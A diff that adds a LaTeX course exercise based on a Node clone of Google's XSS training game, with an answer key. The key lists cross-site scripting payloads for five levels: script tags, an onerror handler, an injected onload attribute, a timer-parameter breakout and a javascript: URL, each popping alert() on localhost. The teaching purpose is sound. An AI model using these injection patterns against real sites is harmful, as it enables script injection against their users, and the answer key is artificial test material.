@@ -1,0 +1,34 @@
+
+\begin{Exercise}[label={websec-xss-game}]
+	The final exercise is game developed by google to teach developers the basics of XSS. The game can be found at https://xss-game.appspot.com/. Since all this course is based on node, and the back-end of the original game is developed in python, we've made our own version. 
+	
+	The game has 6 levels, and each of them explore a diferent type of exploit.
+	
+	\subsubsection{Level 1}
+	\paragraph{Mission Description}
+	This level demonstrates a common cause of cross-site scripting where user input is directly included in the page without proper escaping. 
+	
+	Interact with the vulnerable application window below and find a way to make it execute JavaScript of your choosing. You can take actions inside the vulnerable window or directly edit its URL bar.
+	\paragraph{Mission Objective}
+	Inject a script to pop up a JavaScript alert() in the frame below. 
+
+	\subsubsection{Level 2}
+	\subsubsection{Level 3}
+	\subsubsection{Level 4}
+	\subsubsection{Level 5}
+	\subsubsection{Level 6}
+	
+\end{Exercise}
+\begin{Answer}[ref={websec-xss-game}]
+	\subsubsection{Level 1}
+	<script>alert()</script>
+	\subsubsection{Level 2}
+	<img src='stuff' onerror='alert()'>
+	\subsubsection{Level 3}
+	%https://localhost:8000/#1.jpg'onload='alert("xss")'
+	\subsubsection{Level 4}
+	?timer=')%3Balert(1)%3Bvar b=('
+	\subsubsection{Level 5}
+	%http://localhost:8000/signup?next=javascript:alert(1)
+	\subsubsection{Level 6}
+\end{Answer}
